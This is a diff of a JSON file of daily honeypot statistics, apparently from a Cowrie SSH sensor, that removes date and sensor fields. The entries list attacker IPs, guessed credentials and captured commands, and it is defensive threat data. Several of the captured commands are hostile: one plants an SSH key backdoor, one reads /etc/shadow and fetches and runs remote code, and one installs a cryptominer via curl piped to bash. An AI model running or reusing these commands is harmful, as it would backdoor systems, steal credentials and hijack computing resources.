-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 410
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.53",
       "robot": true,
-      "count": 447,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 447
     },
     {
       "src_ip": "5.188.87.49",
       "robot": true,
-      "count": 428,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 428
     },
     {
       "src_ip": "5.188.86.168",
       "robot": true,
-      "count": 292,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 292
     }
   ],
   "file_download": [
@@ -3980,9 +3000,7 @@
         "positives": 0,
         "total": 57
       },
-      "count": 1,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     },
     {
       "url": null,
@@ -3991,18 +3009,14 @@
         "positives": 0,
         "total": 55
       },
-      "count": 1,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota3.tar.gz",
       "src_ip": "194.6.233.138",
-      "count": 1,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4010,25 +3024,19 @@
       "src_ip": "185.232.67.36",
       "dst_ip": "www.superpromo24.de",
       "dst_port": 443,
-      "count": 1145,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1145
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "24.201.245.33",
       "dst_port": 993,
-      "count": 784,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 784
     },
     {
       "src_ip": "5.188.86.212",
       "dst_ip": "authserver.mojang.com",
       "dst_port": 443,
-      "count": 724,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 724
     }
   ]
 },
@@ -4039,109 +3047,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18156,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18156
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 114,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 114
     },
     {
       "username": "root",
       "password": "123123",
-      "count": 54,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 54
     }
   ],
   "commands": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 1565,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1565
     },
     {
       "input": "uname -a",
-      "count": 141,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 141
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 118,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 118
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 1565,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1565
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 115,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 115
     },
     {
       "input": "uname -a",
-      "count": 24,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 24
     }
   ],
   "connect": [
     {
       "src_ip": "39.106.129.49",
       "dst_port": 2222,
-      "count": 1567,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1567
     },
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1393,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1393
     },
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 1028,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1028
     }
   ],
   "session_closed": [
     {
       "src_ip": "39.106.129.49",
       "robot": true,
-      "count": 1567,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1567
     },
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 983,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 983
     },
     {
       "src_ip": "5.188.87.58",
       "robot": true,
-      "count": 822,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 822
     }
   ],
   "file_download": [
@@ -4152,9 +3130,7 @@
         "positives": 29,
         "total": 57
       },
-      "count": 1,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -4163,18 +3139,14 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "124.160.83.138",
-      "count": 1,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4182,25 +3154,19 @@
       "src_ip": "5.188.86.178",
       "dst_ip": "s.youtube.com",
       "dst_port": 443,
-      "count": 1353,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1353
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 982,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 982
     },
     {
       "src_ip": "5.188.87.58",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 822,
-      "date": "2021-05-04",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 822
     }
   ]
 },
@@ -4211,109 +3177,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18701,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18701
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 841,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 841
     },
     {
       "username": "root",
       "password": "beatriz",
-      "count": 53,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 53
     }
   ],
   "commands": [
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 867,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 867
     },
     {
       "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 866,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 866
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 866,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 866
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 859,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 859
     },
     {
       "input": "cat /etc/issue",
-      "count": 16,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 16
     },
     {
       "input": "uname -s -v -n -r",
-      "count": 8,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 8
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1312,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1312
     },
     {
       "src_ip": "5.188.86.168",
       "dst_port": 2222,
-      "count": 1120,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1120
     },
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 1025,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1025
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 950,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 950
     },
     {
       "src_ip": "5.188.86.168",
       "robot": true,
-      "count": 879,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 879
     },
     {
       "src_ip": "5.188.86.180",
       "robot": true,
-      "count": 861,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 861
     }
   ],
   "file_download": [
@@ -4324,9 +3260,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -4335,25 +3269,19 @@
         "positives": 0,
         "total": 57
       },
-      "count": 1,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "58.56.32.238",
-      "count": 1,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "70.71.148.228",
-      "count": 1,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4361,25 +3289,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 1145,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1145
     },
     {
       "src_ip": "5.188.87.60",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 953,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 953
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 884,
-      "date": "2021-05-09",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 884
     }
   ]
 },
@@ -4390,69 +3312,51 @@
     {
       "username": "root",
       "password": "root",
-      "count": 11,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 11
     },
     {
       "username": "user",
       "password": "user",
-      "count": 8,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 8
     },
     {
       "username": "support",
       "password": "support",
-      "count": 6,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 6
     }
   ],
   "connect": [
     {
       "src_ip": "49.88.112.72",
       "dst_port": 2222,
-      "count": 1235,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1235
     },
     {
       "src_ip": "109.104.151.109",
       "dst_port": 2222,
-      "count": 112,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 112
     },
     {
       "src_ip": "42.192.8.30",
       "dst_port": 2222,
-      "count": 54,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 54
     }
   ],
   "session_closed": [
     {
       "src_ip": "49.88.112.72",
       "robot": false,
-      "count": 672,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 672
     },
     {
       "src_ip": "49.88.112.72",
       "robot": true,
-      "count": 563,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 563
     },
     {
       "src_ip": "109.104.151.109",
       "robot": true,
-      "count": 112,
-      "date": "2021-03-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 112
     }
   ]
 },
@@ -4463,109 +3367,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18234,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18234
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 988,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 988
     },
     {
       "username": "root",
       "password": "admin",
-      "count": 31,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 31
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 1008,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1008
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 1006,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1006
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 1006,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1006
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 995,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 995
     },
     {
       "input": "uname -a & cat /proc/version",
-      "count": 46,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 46
     },
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 33,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 33
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1239,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1239
     },
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 1227,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1227
     },
     {
       "src_ip": "5.188.86.210",
       "dst_port": 2222,
-      "count": 1210,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1210
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 918,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 918
     },
     {
       "src_ip": "5.188.87.53",
       "robot": true,
-      "count": 877,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 877
     },
     {
       "src_ip": "5.188.87.51",
       "robot": true,
-      "count": 872,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 872
     }
   ],
   "file_download": [
@@ -4576,9 +3450,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": "http://209.141.52.40/sensi.sh",
@@ -4587,9 +3459,7 @@
         "positives": 30,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -4598,32 +3468,24 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "181.49.117.166",
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "125.74.27.185",
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "58.213.84.234",
-      "count": 1,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -4631,25 +3493,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 5416,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5416
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1618,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1618
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 918,
-      "date": "2021-06-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 918
     }
   ]
 },
@@ -4660,109 +3516,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18100,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18100
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 735,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 735
     },
     {
       "username": "root",
       "password": "elite",
-      "count": 27,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 27
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 746,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 746
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 745,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 745
     },
     {
       "input": "uname -m",
-      "count": 741,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 741
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 734,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 734
     },
     {
       "input": "uname -a;id;cat /etc/shadow /etc/passwd;lscpu;chattr -ia /root/.ssh/*;wget http://highpower.sg/..... -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget -qO - http://highpower.sg/...|perl;wget http://highpower.sg/.... -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o",
-      "count": 36,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 36
     },
     {
       "input": "cat /etc/issue; wget http://209.141.41.222/bins/jew.x86; chmod 777 jew.x86; ./jew.x86 root; curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4AbDso7DmSjDqQenbJaHvYbuoK1yfZ926UmGqX46THWe2vFSNrRyAzh6aME1cWYT5pMMxH6eiFdc9iecpQn7mm1zLKRxgaV; echo firewalla1337 was here",
-      "count": 14,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 14
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.210",
       "dst_port": 2222,
-      "count": 1414,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1414
     },
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 1339,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1339
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1250,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1250
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.210",
       "robot": true,
-      "count": 1025,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1025
     },
     {
       "src_ip": "5.188.87.60",
       "robot": true,
-      "count": 955,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 955
     },
     {
       "src_ip": "5.188.87.51",
       "robot": true,
-      "count": 930,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 930
     }
   ],
   "file_download": [
@@ -4773,9 +3599,7 @@
         "positives": 0,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -4784,9 +3608,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -4795,32 +3617,24 @@
         "positives": 0,
         "total": 55
       },
-      "count": 1,
-      "date": "2021-06-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "111.30.114.22",
-      "count": 1,
-      "date": "2021-06-13",
